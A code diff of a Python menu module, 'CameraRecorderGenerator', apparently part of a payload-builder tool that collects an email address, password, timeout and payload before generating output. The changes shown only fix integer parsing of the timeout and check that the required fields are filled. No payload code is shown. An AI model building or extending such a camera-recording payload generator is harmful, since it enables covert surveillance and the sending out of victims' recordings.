@@ -48,7 +48,7 @@ class CameraRecorderGenerator(ModuleUtils):
             ╠═════════════════════════════════════╬════════════════════════════════════╣
             ║*            Password                : {COLOR['RESET']}{self.password}{COLOR['CYAN']}{' ' *  (35 - len(self.password))}║
             ╠═════════════════════════════════════╬════════════════════════════════════╣
-            ║*            Time Out                : {COLOR['RESET']}{self.time_out}{COLOR['CYAN']}{' ' *  (35 - len(self.time_out))}║
+            ║*            Time Out                : {COLOR['RESET']}{str(self.time_out)}{COLOR['CYAN']}{' ' *  (35 - len(str(self.time_out)))}║
             ╠═════════════════════════════════════╬════════════════════════════════════╣
             ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
             ╠═════════════════════════════════════╩════════════════════════════════════╣            
@@ -78,16 +78,15 @@ class CameraRecorderGenerator(ModuleUtils):
 
         elif answer.startswith("set timeout"):
             try:
-                if isinstance(answer.split(" ")[2], int):
-                    self.time_out = answer.split(" ")[2]
-                    self.run()
+                self.time_out = int(answer.split(" ")[2])
+                self.run()
                     
-                else:
-                    self.write(message="Please enter integer type", level=4, delay=1, clear=False)
-                    self.run()
-            
             except IndexError:
                 self.write(message="set timeout <delay>", level=4, delay=1, clear=False)
+                self.run()
+                
+            except ValueError:
+                self.write(message="Please enter integer type", level=4, delay=1, clear=False)
                 self.run()
         
         elif answer.startswith("set payload"):
@@ -103,8 +102,8 @@ class CameraRecorderGenerator(ModuleUtils):
             self.list_payloads(self.module)
 
         elif answer == "generate":
-            if self.payload == "":
-                self.write(message="Please Select a Payload.", level=4, delay=1, clear=False)
+            if self.mail == "" or self.password == "" or self.time_out == "" or self.payload == "":
+                self.write(message="Please fill in the required fields.", level=4, delay=1, clear=False)
                 self.run()
             
             else:
